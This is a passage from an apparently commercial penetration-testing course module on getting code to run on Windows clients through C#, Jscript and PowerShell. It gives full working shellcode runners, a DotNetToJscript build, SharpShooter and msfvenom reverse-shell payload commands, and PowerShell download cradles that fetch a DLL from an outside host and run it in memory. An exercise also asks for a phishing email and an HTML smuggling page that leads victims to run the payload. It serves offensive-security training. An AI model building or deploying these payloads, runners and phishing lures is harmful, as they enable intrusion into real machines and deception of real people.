First we'll look up _MessageBox_ on www.pinvoke.net<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_639-1" id="fnref-local_id_639-1">1</a></sup> to help translate the C data types to C# data types.

To use _MessageBoxA_, we need an import statement added inside the _Program_ class but outside the _Main_ method, as shown in Listing 28. With the Win32 API imported, we simply invoke it by supplying text and a caption as highlighted below.

```
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        [<span>DllImport("user32.dll", CharSet=CharSet.Auto)</span>]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
            <span>MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);</span>
        }
    }
}
```

> Listing 28 - C# code to import and use MessageBoxA

As shown in Figure 8, Visual Studio highlights potential issues with the DllImport statement due to missing namespaces. To use the DllImport statement and invoke the Win32 APIs, we have to use the two namespaces (_System.Diagnostics_ and _System.Runtime.InteropServices_) as shown below.

![Figure 8: Missing namespaces](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/c767ddf0e75c1f5c63ecf425774d47d6-cscej_csharp_missing.png)

Figure 8: Missing namespaces

In addition, we need to add the core _System_ namespace that provides us access to all basic data types such as _IntPtr_. Here's our full code so far:

```
<span>using System;</span>
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
<span>using System.Diagnostics;
using System.Runtime.InteropServices;</span>

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```

> Listing 29 - Full code

At this point, we can compile the application without errors and launch it from the command prompt. This should generate a popup with our text.

Now that we've again demonstrated how to import and call Win32 APIs from C# without having to use reflection, in the next section we'll recreate our PowerShell shellcode runner in C#.

#### Exercise

1.  Implement the Win32 _MessageBox_ API call in C# as shown in this section.

### 5.2.4. Shellcode Runner in C#

Now that we have the basic framework, we can reuse the shellcode runner technique from both VBA and PowerShell and combine _VirtualAlloc_, _CreateThread_, and _WaitForSingleObject_ to execute shellcode in memory.

The first step is to use DllImport to import the three Win32 APIs and configure the appropriate argument data types. This is unchanged from our experience with _Add-Type_ and PowerShell. The imports are shown in Listing 30.

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr <span>VirtualAlloc</span>(IntPtr lpAddress, uint dwSize, uint flAllocationType, 
    uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr <span>CreateThread</span>(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 <span>WaitForSingleObject</span>(IntPtr hHandle, UInt32 dwMilliseconds);
```

> Listing 30 - Importing Win32 APIs for shellcode runner

Next, we need to generate our shellcode. Keep in mind that on a 64-bit Windows operating system, Jscript will execute in a 64-bit context by default so we have to generate a 64-bit Meterpreter staged payload in _csharp_ format. While we're at it, we'll set up our multi/handler with the same payload.

Calling the APIs from C# is similar to our experience with PowerShell. However, we do not have to specify .NET namespaces like _\[System.Runtime.InteropServices.Marshal\]_ or the runtime compiled classes to invoke them.

In Listing 31, the calls to the three Win32 APIs along with the managed to unmanaged memory copy are present, and constitute the last part of the shellcode runner. This should look very similar to what we did earlier.

Let's discuss a few details of this code, starting with the variable declarations. The first, _buf_, is our shellcode. Next is our _size_ variable that stores the size of our _buf_ variable. As mentioned earlier, we use _Marshal.Copy_, but don't have to specify the .NET namespace of _\[System.Runtime.InteropServices.Marshal\]_.

```
byte[] buf = new byte[626] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8...

int size = buf.Length;

IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

<span>Marshal.Copy(buf, 0, addr, size);</span>

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);
```

> Listing 31 - Win32 APIs called from C# to execute shellcode

We'll once again use the _WaitForSingleObject_ API to let the shellcode finish execution. Otherwise, the Jscript execution would terminate the process before the shell becomes active.

Here's the full code of our C# shellcode runner:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

> Listing 32 - Win32 APIs called from C# to execute shellcode full code

**Before compiling this project**, we must set the CPU architecture to _x64_ since we are using 64-bit shellcode. This is done through the _CPU_ drop down menu, where we open the _Configuration Manager_ as shown in Figure 9.

![Figure 9: Opening Configuration Manager in Visual Studio](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/6eedeaadd93b7fb06f65560bbebc412b-cscej_conf_man.png)

Figure 9: Opening Configuration Manager in Visual Studio

In the Configuration Manager, we choose _<New...>_ from the _Platform_ drop down menu and accept the new platform as _x64_, as shown in Figure 10.

![Figure 10: Opening Configuration Manager in Visual Studio](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/aabeb41eff4a683c8952091ef5cebfe8-cscej_conf_man_new.png)

Figure 10: Opening Configuration Manager in Visual Studio

Now we'll need to compile the C# project, which will generate an executable on our Samba share. Executing it will give us a reverse Meterpreter shell.

Nice. We are one step closer. In the next section we will get this running in the context of the DotNetToJscript project.

#### Exercise

1.  Recreate the C# shellcode runner and obtain a reverse shell.

### 5.2.5. Jscript Shellcode Runner

Now that we have the C# shellcode runner working, we must modify the ExampleAssembly project in DotNetToJscript to execute the shellcode runner instead of the previous simple proof of concept code. We'll also generate a Jscript file with the compiled assembly so we can launch the shellcode runner directly from Jscript.

As mentioned earlier, any declarations using DllImport must be placed in the relevant class, but outside the method it is used in. In this case, we need to put them in the _TestClass_ class as shown below in Listing 33.

Note that we added the needed namespaces at the beginning of the project with the "using" keyword followed by the namespace:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

...
```

> Listing 33 - Win32 APIs imported in ExampleAssembly

Next, we'll add the same shellcode and method calls inside the _TestClass_ method as in our standalone project:

```
public TestClass()
{
      byte[] buf = new byte[626] {
          0xfc,0x48,0x83,0xe4,0xf0,0xe8...

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
}
```

> Listing 34 - Win32 APIs used for shellcode execution

Before we compile the ExampleAssembly project, we need to specify the x64 platform. After compilation, we need to copy the compiled DLL into the same folder as DotNetToJscript.exe on the Windows 10 development machine.

Now that we have our updated DLL in place, we can invoke DotNetToJscript with the same arguments as earlier, telling it to use version 4 of the .NET framework and output a Jscript file, as shown below.

```
C:\Tools&gt; <span>DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js</span>
```

> Listing 35 - Invoking DotNetToJscript to create a Jscript shellcode runner

With our multi/handler set up, we can double-click the Jscript file. After a brief pause, we should receive the staged reverse Meterpreter shell. Very nice.

We have successfully leveraged Jscript to deliver an arbitrary C# assembly, which in our case is a shellcode runner.

#### Exercises

1.  Recreate the steps to obtain a Jscript shellcode runner.
2.  Use DotNetToJscript to obtain a shellcode runner in VBScript format.

#### Extra Mile

Create the text for a phishing email using a pretext that would make sense for your organization, school, or customer. Frame the text to convince the victim to click on an embedded link that leads to an HTML page on your Kali system.

Manually create the HTML page sitting on your Apache web server so it performs HTML smuggling of a Jscript shellcode runner when the link is opened with Google Chrome. Ensure that the email text and the content of the HTML page encourage the victim to run the Jscript file.

### 5.2.6. SharpShooter

In recent years, it has become much more common to use DotNetToJscript to weaponize C# compiled assemblies in other file formats (like Jscript, VBScript, and even Microsoft Office macros). A payload generation tool called _SharpShooter_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_642-1" id="fnref-local_id_642-1">1</a></sup> has been created to assist with this.

SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code"<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_642-1" id="fnref-local_id_642-1:1">1:1</a></sup> and automates part of the process discussed in this module. As with any automated tool, it is vital that we understand how it works, especially when it comes to bypassing security software and mitigations that will be present in most organizations.

SharpShooter is capable of evading various types of security software but that topic is outside the scope of this module.

We can install SharpShooter on Kali with git clone and Python pip<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_642-2" id="fnref-local_id_642-2">2</a></sup> as shown in Listing 36.

```
kali@kali:~$ <span>cd /opt/</span>

kali@kali:/opt$ <span>sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git</span>
Cloning into 'SharpShooter'...

kali@kali:/opt$ <span>cd SharpShooter/</span>

kali@kali:/opt/SharpShooter$ <span>sudo pip install -r requirements.txt</span>
```

> Listing 36 - Installing SharpShooter on Kali Linux

If confronted with a message saying that pip cannot be found, install the package with sudo apt install python-pip

With SharpShooter installed, we'll try to replicate what we did manually in this module, creating a shellcode runner with Jscript by leveraging DotNetToJscript.

First, we'll use msfvenom to generate our Meterpreter reverse stager and write the _raw_ output format to a file.

```
kali@kali:/opt/SharpShooter$ <span>sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt</span>
...
Payload size: 716 bytes
<span>Saved as: /var/www/html/shell.txt</span>
```

> Listing 37 - Creating a raw Meterpreter staged payload

Next, we'll invoke SharpShooter.py while supplying a number of parameters, as shown in Listing 38. The first \--payload js, will specify a Jscript output format. The next parameter, \--dotnetver, sets the .NET framework version to target. The \--stageless parameter specifies in-memory execution of the Meterpreter shellcode.

The term stageless for SharpShooter refers to whether the entire Jscript payload is transferred at once, or if HTML smuggling is used with a staged Jscript payload.

\--rawscfile specifies the file containing our shellcode and we set our output file with \--output, leaving off the file extension. The full command is shown in Listing 38.

```
kali@kali:/opt/SharpShooter$ <span>sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test</span>
...
    
[*] Written delivery payload to output/test.js
```

> Listing 38 - Generating malicious Jscript file with SharpShooter

Once again we must configure a multi/handler matching the generated Meterpreter shellcode. When that is done, we need to copy the generated test.js file to our Windows 10 victim machine. When we double-click it, we obtain a reverse shell.

Using an automated tool can greatly improve productivity and reduce repetitive tasks, but it is always important to understand the techniques employed and the operation of underlying code.

So far, we have taken advantage of both PowerShell and compiled C# assemblies, but we can also combine the two to dynamically load assemblies through PowerShell without touching the disk.

#### Exercises

1.  Install SharpShooter on Kali and generate a Jscript shellcode runner.
2.  Expand on the attack by creating a staged attack<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_642-3" id="fnref-local_id_642-3">3</a></sup> that also leverages HTML smuggling to deliver the malicious Jscript file.

## 5.3. In-memory PowerShell Revisited

We developed powerful tradecraft With Windows Script Host and C#. Let's go back and combine that with our PowerShell and Office tradecraft from the previous module to develop another way of executing C# code entirely in memory.

One of the issues when executing PowerShell in-memory was the use of _Add-Type_ or the rather complicated use of reflection. While we proved that it is possible to call Win32 APIs and create a shellcode runner in PowerShell entirely in-memory, we can also do this by combining PowerShell and C#.

Using the _Add-Type_ keyword made the .NET framework both compile and load the C# assembly into the PowerShell process. However, we can separate these steps, then fetch the pre-compiled assembly and load it directly into memory.

### 5.3.1. Reflective Load

To begin, we'll open the previous ConsoleApp1 C# project in Visual Studio. We'll create a new project in the solution to house our code by right-clicking _Solution 'ConsoleApp1'_ in the Solution Explorer, navigating to _Add_, and clicking _New Project..._ as shown in Figure 11.

![Figure 11: Creating a new project from Solution Explorer](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/6d61a9df4d60b8f4b1ade7b7b7cca4c5-cscej_load_newproject.png)

Figure 11: Creating a new project from Solution Explorer

From the _Add a new project_ menu, we'll select _Class Library (.Net Framework)_, which will create a managed DLL when we compile (Figure 12).

![Figure 12: Selecting a Class Library project](https://static.offsec.com/offsec-courses/PEN-300/imgs/cscej/d6c43130d2afc775320ad330bdd246a1-cscej_load_newpdll.png)

Figure 12: Selecting a Class Library project

After clicking _Next_, we'll accept the default name of ClassLibrary1, click _Create_, and accept the security warning about remote projects.

The process of creating a managed EXE is similar to that of creating a managed DLL. In fact, we can begin by copying the contents of the _Program_ class of the ConsoleApp1 project into the new _Class1_ class. We'll copy the DllImport statements as-is then create a _runner_ method with the prefixes _public_, _static_, and _void_. This will serve as the body of the shellcode runner and must be available through reflection, which is why we declared it as public and static.

```
public class Class1
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
    }
```

> Listing 39 - DllImports and definition of runner method

Next we'll copy the exact content of the _Main_ method of the ConsoleApp1 project into the runner method. We'll also need to replace the namespace imports to match those of the ConsoleApp1 project.

With the C# code complete, we can compile it and copy the resulting DLL (ClassLibrary1.dll) into the web root of our Kali Linux machine.

Once the file is in place, we'll ensure that Apache is started and configure a multi/handler Metasploit listener.

In a new 64-bit session of PowerShell ISE on the Windows 10 development machine, we'll use a download cradle to fetch the newly-compiled DLL. As shown in Listing 40, we'll use the _LoadFile_ method from the _System.Reflection.Assembly_ namespace to dynamically load our pre-compiled C# assembly into the process. This works in both PowerShell and native C#.

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
```

> Listing 40 - Downloading the assembly and loading it into memory

After the assembly is loaded, we can interact with it using reflection through the _GetType_ and _GetMethod_ methods, and finally call it through the _Invoke_ method:

```
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

> Listing 41 - Executing the loaded assembly using reflection

Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the _Load_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_644-1" id="fnref-local_id_644-1">1</a></sup> method, which accepts a _Byte_ array in memory instead of a disk file. In this case, we'll modify our PowerShell code to use the _DownloadData_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_644-2" id="fnref-local_id_644-2">2</a></sup> method of the _Net.WebClient_ class to download the DLL as a byte array.

```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

> Listing 42 - Using DownloadData and Load to execute the assembly from memory

With this change, we have successfully loaded precompiled C# assembly directly into memory without touching disk and executed our shellcode runner. Excellent!

#### Exercises

1.  Build the C# project and compile the code in Visual Studio.
2.  Perform the dynamic load of the assembly through the download cradle both using _LoadFile_ and _Load_ (Remember to use a 64-bit PowerShell ISE console).
3.  Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.

## 5.4. Wrapping Up

In this module, we have explored another avenue of client-side code execution using Jscript and C#, with the same low-profile capability as our previous version that leveraged Microsoft Office and PowerShell.

Even though we have used multiple languages and techniques to obtain code execution, there are even more combinations in the wild. Penetration testers have used the _HTML Application_ or _HTA_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-1" id="fnref-local_id_645-1">1</a></sup> attack against Internet Explorer for many years. The combination of HTA and HTML smuggling has allowed it to be efficiently used against other browsers and weaponized as the _Demiguise_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-2" id="fnref-local_id_645-2">2</a></sup> tool.

A somewhat newer technique leverages the ability to instantiate other scripting engines in .NET like _IronPython_,<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-3" id="fnref-local_id_645-3">3</a></sup> which lets a penetration tester combine the power of Python and .NET. _Trinity_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-4" id="fnref-local_id_645-4">4</a></sup> is a framework for implementing this post-exploitation.

_Java_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-5" id="fnref-local_id_645-5">5</a></sup>\-based _Java Applets_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-6" id="fnref-local_id_645-6">6</a></sup> and Java _JAR_<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-7" id="fnref-local_id_645-7">7</a></sup> files can be used to gain client-side code execution. The most common variant using Java JAR files in the wild is called _jRAT_ or _Adwind_.<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-8" id="fnref-local_id_645-8">8</a></sup> This variant implements reflection and in-memory compilation techniques in Java. Java also contains a built-in JavaScript scripting engine called _Nashhorn_.<sup><a href="https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/client-side-code-execution-with-windows-script-host-15053#fn-local_id_645-9" id="fnref-local_id_645-9">9</a></sup>

-   © 2024  [OffSec](https://www.offsec.com/)
|-   [Privacy](https://www.offsec.com/privacy-policy/)
|-   [Terms of service](https://www.offsec.com/terms-and-conditions-of-use/)

Previous Module

Phishing with Microsoft Office

Next Module

Reflective PowerShell